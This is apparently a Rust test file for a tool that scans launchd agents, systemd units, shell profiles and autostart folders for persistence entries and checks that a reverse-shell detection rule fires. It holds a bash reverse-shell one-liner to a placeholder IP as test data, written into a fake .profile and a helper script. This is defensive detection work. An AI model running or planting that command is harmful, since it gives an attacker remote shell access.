use super::*;
use borg_core::{StartupPlace, startup_filtered};
use std::{
    os::unix::fs::{PermissionsExt, symlink},
    time::{Duration, UNIX_EPOCH},
};

const AGENT: &str = r#"<?xml version="1.0" encoding="UTF-8"?>
<plist version="1.0"><dict>
<key>Label</key><string>com.example.helper</string>
<key>ProgramArguments</key><array><string>PROGRAM</string><string>--quiet</string></array>
<key>RunAtLoad</key><true/>
</dict></plist>
"#;
const MISSING_AGENT: &str = r#"<plist version="1.0"><dict>
<key>Label</key><string>com.example.gone</string>
<key>Program</key><string>/nonexistent/borg-test/gone</string>
</dict></plist>
"#;
const SHELL_RULE_TEXT: &str = "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n";
const UNIT: &str = "[Service]\nExecStart=/bin/sh -c true\n[Install]\nWantedBy=default.target\n";

fn write(path: &Path, text: &str, seconds: u64) {
    fs::create_dir_all(path.parent().unwrap()).unwrap();
    fs::write(path, text).unwrap();
    fs::File::options()
        .write(true)
        .open(path)
        .unwrap()
        .set_modified(UNIX_EPOCH + Duration::from_secs(seconds))
        .unwrap();
}

fn spot(place: StartupPlace, format: StartupFormat, path: PathBuf, folder: bool) -> StartupSpot {
    let extensions: &'static [&'static str] = match format {
        StartupFormat::Launchd => &["plist"],
        StartupFormat::Unit => &["service", "timer"],
        _ => &[],
    };
    StartupSpot { place, format, path, folder, extensions, read_only: false }
}

#[test]
fn places_read_newest_first_with_owner_program_and_rule_hits() {
    let temp = tempfile::tempdir().unwrap();
    let home = temp.path().join("home");
    let program = home.join("bin/helper");
    write(&program, &format!("#!/bin/sh\n{SHELL_RULE_TEXT}"), 100);
    fs::set_permissions(&program, fs::Permissions::from_mode(0o755)).unwrap();
    let agents = home.join("Library/LaunchAgents");
    write(&agents.join("com.example.helper.plist"), &AGENT.replace("PROGRAM", &program.to_string_lossy()), 300);
    write(&agents.join("com.example.gone.plist"), MISSING_AGENT, 200);
    write(&agents.join("notes.txt"), "not an agent", 900);
    let profile = home.join(".profile");
    write(&profile, SHELL_RULE_TEXT, 400);
    let spots = [
        spot(StartupPlace::UserAgent, StartupFormat::Launchd, agents, true),
        spot(StartupPlace::ShellStartup, StartupFormat::Shell, profile.clone(), false),
        spot(StartupPlace::ShellStartup, StartupFormat::Shell, home.join(".zshrc"), false),
        spot(StartupPlace::Daemon, StartupFormat::Launchd, temp.path().join("nowhere"), true),
    ];
    let report = read_places(&spots, &home, &Rules::compile(&[]));
    let names: Vec<_> = report.items.iter().map(|item| item.found.name.as_str()).collect();
    assert_eq!(names, [".profile", "com.example.helper", "com.example.gone"]);
    assert!(report.unread.is_empty(), "{:?}", report.unread);

    let [shell, helper, gone] = &report.items[..] else { unreachable!() };
    assert_eq!(shell.modified, Some(UNIX_EPOCH + Duration::from_secs(400)));
    assert_eq!(shell.owner, uzers::get_current_username().map(|name| name.to_string_lossy().into_owned()));
    assert_eq!(shell.rule_names(), ["reverse_shell"]);
    assert!(!shell.hits[0].in_program);
    assert_eq!(helper.presence, ProgramPresence::Present);
    assert_eq!(
        helper.hits.iter().filter(|hit| hit.in_program).map(|hit| hit.rule.rule.as_str()).collect::<Vec<_>>(),
        ["reverse_shell"]
    );
    assert_eq!(gone.presence, ProgramPresence::Missing);
    assert_eq!(startup_filtered(&report.items, "reverse_shell"), [0, 1]);
}

#[test]
fn units_pulled_in_from_elsewhere_are_read_and_linked_copies_once() {
    let temp = tempfile::tempdir().unwrap();
    let units = temp.path().join("systemd/user");
    write(&units.join("notes.service"), UNIT, 10);
    write(&units.join("notes.timer"), "[Timer]\nOnCalendar=daily\n", 20);
    let elsewhere = temp.path().join("opt/sneaky.service");
    write(&elsewhere, UNIT, 30);
    let wants = units.join("default.target.wants");
    fs::create_dir_all(&wants).unwrap();
    symlink(units.join("notes.service"), wants.join("notes.service")).unwrap();
    symlink(&elsewhere, wants.join("sneaky.service")).unwrap();
    let spots = [spot(StartupPlace::UserService, StartupFormat::Unit, units, true)];
    let report = read_places(&spots, temp.path(), &Rules::compile(&[]));
    let read: Vec<_> = report.items.iter().map(|item| (item.place, item.found.name.as_str())).collect();
    assert_eq!(
        read,
        [
            (StartupPlace::UserService, "sneaky.service"),
            (StartupPlace::UserTimer, "notes.timer"),
            (StartupPlace::UserService, "notes.service"),
        ]
    );
    assert_eq!(report.items[2].presence, ProgramPresence::Present);
}

#[test]
fn a_closed_folder_is_listed_as_unread() {
    let temp = tempfile::tempdir().unwrap();
    let closed = temp.path().join("autostart");
    write(&closed.join("chat.desktop"), "[Desktop Entry]\nExec=chat\n", 10);
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o000)).unwrap();
    let readable = fs::read_dir(&closed).is_ok();
    let spots = [spot(StartupPlace::Autostart, StartupFormat::Desktop, closed.clone(), true)];
    let report = read_places(&spots, temp.path(), &Rules::compile(&[]));
    fs::set_permissions(&closed, fs::Permissions::from_mode(0o755)).unwrap();
    if readable {
        return;
    }
    assert!(report.items.is_empty());
    assert_eq!(report.unread.iter().map(|(path, _)| path.clone()).collect::<Vec<_>>(), [closed]);
}

#[test]
fn programs_are_found_by_path_in_the_home_folder_and_in_the_search_path() {
    let temp = tempfile::tempdir().unwrap();
    write(&temp.path().join("bin/tool"), "", 1);
    assert_eq!(locate("~/bin/tool", temp.path()), (ProgramPresence::Present, Some(temp.path().join("bin/tool"))));
    assert_eq!(locate("~/bin/gone", temp.path()), (ProgramPresence::Missing, None));
    assert_eq!(locate("sh", temp.path()).0, ProgramPresence::Present);
    assert_eq!(locate("borg-no-such-program", temp.path()), (ProgramPresence::Unknown, None));
    assert_eq!(locate("bin/tool", temp.path()), (ProgramPresence::Unknown, None));
}
